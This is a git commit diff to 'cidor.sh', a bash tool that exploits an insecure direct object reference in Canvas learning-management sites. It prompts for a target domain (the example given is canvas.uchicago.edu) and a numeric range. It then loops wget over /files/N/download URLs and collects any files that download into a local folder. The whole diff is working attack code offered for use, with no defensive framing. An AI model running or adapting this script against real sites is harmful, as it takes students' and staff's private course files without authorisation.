869d046deeaea3bb069cbedbadde5ed0e658cf33
n3onhacks <97998625+n3onhacks@users.noreply.github.com>
2022-01-19 00:36:06 -0600

    Update cidor.sh

--- cidor.sh
+++ cidor.sh
@@ -6,32 +6,31 @@ echo "CIDOR - Canvas IDOR checker v.1"
 echo "Usage: checks domain/[num]/files to check for accessible files via Canvas IDOR (CIDOR) issue"
 echo "...cleaning previous results..."
 
-#Clearing Out Previous Files
-> cidor_results.txt
-> times.txt
-> times_final.txt
-> Updated_Results.txt
-> Final_Results.sh
-
 #Target Selection, Options
 echo "SELECT your TARGET (ex: canvas.uchicago.edu):"
 read DOMAIN
-echo "What number would you like to loop until (ex: 300):"
+echo "What number would you like to START FUZZING at? (ex: 300):"
+read FIRST
+echo "What number would you like to STOP FUZZING at? (ex: 10000):"
 read NUMBER
 echo "..::Starting Canvas IDOR::.."
-                                                               
+
 #URL Layout Options
 a="https://"
 b=$DOMAIN
-c="/courses/"
+c="/files/"
 d=1
-e="/files/"
+e="/download/"
 f="cidor_results.txt"
 g=$NUMBER
+h=$FIRST
 target=${a}${b}${c}${d}${e}
 
+
+cd temp
+
 #Loop for IDOR by numbers 
-for ((d=1; d<=${g}; d++))
+for ((d=${h}; d<=${g}; d++))
 do
 	wget --append-output=${f} ${a}${b}${c}${d}${e}
 	echo ${a}${b}${c}${d}${e}
@@ -39,31 +38,24 @@ do
 
 #Pre-results
 echo "Completed. Querying through logs....."
-echo "What responses would you like to view? (Ex: 200)"
-read SELECTED
-h=$SELECTED
-cat cidor_results.txt | grep ${h} | cut -d " " -f 2 | tr -d "" > times.txt 
-echo "Loading results"
-echo "[0000xxxxxxxxxxxxxxxx]"
-echo "[000000000xxxxxxxxxxx]"
-echo "[000000000000xxxxxxxx]"
-echo "[0000000000000000xxxx]"
-echo "[00000000000000000000]"
+cat /opt/cidor2/temp/cidor_results.txt | grep -B 22 "50K .........." > /opt/cidor2/temp/cleaner1.txt 
+cat /opt/cidor2/temp/cleaner1.txt | grep "Saving to" | cut -d " " -f 3 | tr -d ":" > /opt/cidor2/temp/cleaner2.txt
+cat /opt/cidor2/temp/cleaner2.txt | awk '{print substr($0,2,length($0)-2)}' > /opt/cidor2/temp/clean.txt
 
-#Cleanup times.txt prior to creating cidor_times.sh file for results.
-grep -v "request" times.txt > times_final.txt
-
-#Make Final_Results.sh
-File="times_final.txt"
-echo "#!/bin/bash" > Final_Results.sh
+#Final Horrahc
+File="/opt/cidor2/temp/clean.txt"
+echo "#!/bin/bash" > /opt/cidor2/temp/final_results.sh
 Lines=$(cat $File)
 for Line in $Lines
 do
-echo "cat cidor_results.txt | grep '$Line'" > Updated_Results.txt
-cat Updated_Results.txt | uniq > Final_Results.sh
-chmod +x Final_Results.sh
-./Final_Results.sh
+echo "cp /opt/cidor2/temp/'$Line' /opt/cidor2/downloads" > /opt/cidor2/temp/updated_results.txt
+cat /opt/cidor2/temp/updated_results.txt > /opt/cidor2/temp/final_results.sh
+chmod 777 /opt/cidor2/temp/final_results.sh
+./final_results.sh
 
-echo "View full results at cidor_results.txt"
+cat /opt/cidor2/temp/cleaner1.txt
+echo "Application/Pdf Files Revieved:"
+ls -l /opt/cidor2/downloads/
 
-	done
+
+done
